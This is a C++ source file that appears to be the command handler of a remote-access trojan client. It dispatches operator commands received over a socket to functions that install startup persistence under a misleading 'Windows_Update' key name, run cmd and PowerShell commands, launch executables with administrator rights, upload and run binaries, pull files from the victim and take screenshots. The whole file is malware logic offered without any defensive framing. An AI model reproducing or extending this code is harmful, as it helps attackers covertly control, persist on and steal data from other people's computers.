#include "Factory_Client.h"

std::vector<std::string> split(const char* buffer)
{
	std::string s = std::string(buffer);
	std::vector<std::string> args;
	const std::string delimiter = " ";
	unsigned short pos = 0;
	auto start = 0U;
	auto end = s.find(delimiter);
	while (end != std::string::npos)
	{
		//	std::cout << s.substr(start, end - start) << std::endl;
		args.push_back(s.substr(start, end - start));
		std::cout << "Args " << args[pos] << std::endl;
		start = end + delimiter.length();
		end = s.find(delimiter, start);
	}
	args.push_back(s.substr(start, end));
	//std::cout << s.substr(start, end);
	return args;
}

Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pbuffer),client(clientp)
{
	args = split(pbuffer);

	if (args[0] == "self_persistence")
	{
		arg_self_persistence();
	}
	else if (args[0] == "persistence" && args.size() == 3)
	{
		persistence(client,args[1], (wchar_t*)args[2].c_str());
	}
	else if (args[0] == "persistence" && args.size() == 2)
	{
		persistence(client, args[1],L"Windows_Update");
	}
	else if (args[0] == "getip" && args.size() == 1)
	{
		client->send_b(Auto::get_ip().c_str());
	}
	else if (args[0] == "mute" && args.size() == 1)
	{
		client->setMute(1);
	}
	else if (args[0] == "unmute" && args.size() == 1)
	{
		client->setMute(0);
	}
	  // ----------------------------------- SYSTEM COMMAND -----------------------------------
	else if (args[0] == "cd" && args.size() == 2)
	{
		Shell::cd(client,args[1]);
	}
	else if (args[0] == "ls" && args.size() == 1)
	{
		Shell::ls(client->getSock());
	}
	else if (args[0] == "pwd" && args.size() == 1)
	{
		Shell::pwd(client->getSock());
	}
	else if (args[0] == "ps" && args.size() == 1)
	{
		Shell::ps(client);
	}
	else if (args[0] == "kill" && args.size() == 3)
	{
		Shell::kill(client,args);
	}
	else if (args[0] == "cmd" && args.size() >= 2)
	{
		Shell::runCMD(client->getSock(), args);
	}
	else if (args[0] == "powershell" && args.size() >= 2)
	{
		Shell::runPOWERSHELL(client->getSock(), args);
	}
	else if (args[0] == "exe" && args.size() == 2)
	{
		Shell::exe(client, args[1]);
	}
	else if (args[0] == "exe_admin" && args.size() == 2)
	{
		Shell::exeAdmin(client, args[1]);
	}
	else if (args[0] == "getsysinfo" && args.size() == 1)
	{
		InfoClient::getsysinfo(client);
	}
	// ----------------------------------------TRANSFER ------------------------------------
	else if (args[0] == "getTemp" && args.size() == 1)
	{
		Transfer::getTemp(client);
	}
	else if (args[0] == "upload" && args.size() == 2)
	{
		Transfer::uploadToClient(client, args[1]);
	}
	else if (args[0] == "upload_exe" && args.size() == 2)
	{
		Shell::uploadToClientExe(client,args[1]);
	}
	else if (args[0] == "download" && args.size() == 2)
	{
		Transfer::downloadFromClient(client, args[1]);
	}
	else if (args[0] == "screenshot" && args.size() ==1)
	{
		Transfer::screenshot(client);
	}
	else if (args[0] == "ask" && args.size() == 2)
	{
		Transfer::ask(client,args[1], DEFAULT_NAME);
	}
	else if (args[0] == "ask" && args.size() == 3)
	{
		Transfer::ask(client, args[1], args[2]);
	}
	else
		if (!client->getMute())
		{
			client->send_b(("Command " + buffer + " not found").c_str());
		}

}

void Factory_Client::arg_self_persistence()
{
	std::string keyname;
	if (args.size() == 2)
		keyname = args[1];
	else
		keyname = "Windows_update";

	std::wstring_convert< std::codecvt<wchar_t, char, std::mbstate_t> > conv;
	std::wstring wstr = conv.from_bytes(keyname);
	client->send_b("Putting persistence with keyname : ");
	client->send_b(keyname.c_str());
	Auto::persistence(wstr.c_str());
}